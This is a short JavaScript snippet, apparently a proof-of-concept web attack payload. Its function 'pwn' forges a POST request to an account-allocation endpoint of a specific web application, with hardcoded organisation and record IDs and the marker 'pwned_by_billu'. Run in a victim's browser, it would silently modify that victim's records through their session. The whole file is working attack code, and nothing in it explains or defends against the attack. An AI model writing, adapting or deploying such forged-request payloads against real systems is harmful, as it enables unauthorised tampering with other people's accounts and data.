
function pwn(){
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("load").innerHTML = this.responseText;
    }
  };
  xhttp.open("POST", "/AccountAllocations/SaveAccountAllocation", true);
  xhttp.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
  xhttp.setRequestHeader('Content-Type', 'application/json');
  var body = "{\"OrgId\":10530,\"AccountAllocationId\":61520,\"RangeId\":\"61822\",\"Name\":\"boxed\",\"Description\":\"pwned_by_billu\",\"RangeDeleted\":false,\"RangeFromDate\":\"04/23/2018\",\"RangeToDate\":\"12/31/9999\",\"RangeDetails\":\"\",\"FilterMode\":0,\"ShiftTypeIds\":\"\",\"LocationIds\":\"\",\"Action\":\"2\",\"Splits\":[{\"Name\":\"Master\",\"IsMaster\":true,\"AARS_ID\":\"61164\",\"WageCodes\":[],\"Details\":[{\"AARSD_ID\":62362,\"ACCD_ID\":1,\"Percent\":\"100\",\"IsDefault\":true}]}],\"AdHocCodes\":[],\"CustomACCD_ID\":-99999}"; 
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhttp.send(new Blob([aBody]));
}
